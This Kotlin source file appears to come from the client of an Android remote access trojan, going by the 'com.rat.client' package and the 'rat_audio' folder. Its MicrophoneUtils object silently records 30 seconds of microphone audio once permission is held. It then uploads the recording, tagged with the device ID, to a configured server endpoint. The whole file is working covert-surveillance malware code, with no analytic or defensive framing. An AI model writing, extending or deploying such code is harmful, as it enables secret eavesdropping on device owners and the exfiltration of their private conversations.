package com.rat.client.utils

import android.Manifest
import android.content.Context
import android.media.MediaRecorder
import android.util.Log
import com.rat.client.Config
import java.io.File

/**
 * Records audio from the device microphone.
 */
object MicrophoneUtils {
    private const val TAG = "MicrophoneUtils"
    private const val RECORDING_DURATION_MS = 30000L // 30 seconds
    private var recorder: MediaRecorder? = null

    /**
     * Record audio for a set duration and upload to server.
     */
    fun recordAudio(context: Context): File? {
        if (!PermissionManager.hasPermissions(context, arrayOf(Manifest.permission.RECORD_AUDIO))) {
            Log.w(TAG, "Microphone permission not granted")
            return null
        }

        return try {
            val outputDir = File(context.cacheDir, "rat_audio")
            outputDir.mkdirs()
            val outputFile = File(outputDir, "recording_${System.currentTimeMillis()}.3gp")

            recorder = MediaRecorder()
            recorder?.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setAudioChannels(1)
                setAudioSamplingRate(8000)
                setAudioEncodingBitRate(12200)
                setOutputFile(outputFile.absolutePath)

                try {
                    prepare()
                    start()
                    Log.d(TAG, "Recording started: ${outputFile.name}")

                    // Record for the specified duration
                    Thread.sleep(RECORDING_DURATION_MS)

                    stop()
                    release()
                    recorder = null

                    if (outputFile.exists() && outputFile.length() > 0) {
                        Log.d(TAG, "Recording saved: ${outputFile.absolutePath} (${outputFile.length()} bytes)")
                        uploadRecording(context, outputFile)
                        return outputFile
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Recording error: ${e.message}")
                    try { stop() } catch (_: Exception) {}
                    release()
                    recorder = null
                }
            }

            null
        } catch (e: Exception) {
            Log.e(TAG, "Microphone error: ${e.message}")
            null
        }
    }

    private fun uploadRecording(context: Context, file: File) {
        try {
            val extraFields = mapOf(
                "deviceId" to DeviceInfoUtils.getDeviceId(context),
                "fileName" to file.name,
                "duration" to (RECORDING_DURATION_MS / 1000).toString(),
                "mimeType" to "audio/3gpp",
            )
            ApiClient.uploadFile(Config.Api.UPLOAD_RECORDING, file, extraFields)
            Log.d(TAG, "Recording uploaded: ${file.name}")
        } catch (e: Exception) {
            Log.e(TAG, "Upload recording error: ${e.message}")
        }
    }
}

